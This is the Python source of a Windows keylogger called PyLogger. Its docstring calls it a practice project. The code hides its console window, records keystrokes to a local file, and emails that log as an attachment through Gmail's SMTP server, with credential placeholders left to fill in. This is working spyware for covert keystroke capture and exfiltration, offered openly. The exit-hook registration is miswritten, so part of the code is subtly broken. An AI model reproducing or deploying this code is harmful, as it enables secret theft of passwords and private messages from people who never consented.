"""""
Title         : PyLogger
Author        : Manuel Zabala
Created       : 2/8/2019
Description   : Windows keylogger written in python. This was built simply as a practice project and is not meant
                for malicious use.  
"""""
import win32console
import win32gui
import smtplib
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import atexit


# Using win32 to hide the window produced by the script
def hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def record_keystroke(keystroke):
    char = str(keystroke).replace("'", "")

    # Ignoring keystrokes that are not letters/spaces/newlines
    ignored_keys = ['Key.shift', 'Key.backspace', 'Key.shift_r']

    if char in ignored_keys:
        char = ''
    if char == 'Key.space':
        char = ' '
    if char == 'Key.enter':
        char = '\n'

    # Opening the txt file that will hold the recorded keystrokes
    with open('KeystrokeLog.txt', 'a') as keystroke_log:
        keystroke_log.write(char)


def send_email():
    fromaddr = 'YOUR EMAIL'
    toaddr = 'EMAIL TO SEND TO'

    # Constructing a multipart email with from/to/subject/body/attachment
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Ethical Keylogger"

    body = "BODY MESSAGE GOES HERE"
    msg.attach(MIMEText(body, 'plain'))

    # Pointing to the keystroke log generated by the app for attachment to email
    filename = "KeystrokeLog.txt"
    attachment = open("PATH TO THE LOG", "rb")

    # Constructing the actual attachment portion of the and encoding the attachment itself in base64. Will not work otherwise.
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    # Google no longer supports authentication from 3rd part apps. Generate an app key or allow less secure apps in settings.
    # This code snippet makes a connection with gmail and sends the email via the fromaddr account.
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "YOUR PASSWORD")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


if __name__ == "__main__":
    # hide the app on start (window disappears)
    hide()
    # Registering the exit command, in this case, sending an email with the KeystrokeLog.txt as an attachment
    atexit.register(send_email())
    # Recording keystrokes to KeystrokeLog.txt while program is running
    with Listener(on_press=record_keystroke) as listener:
        listener.join()
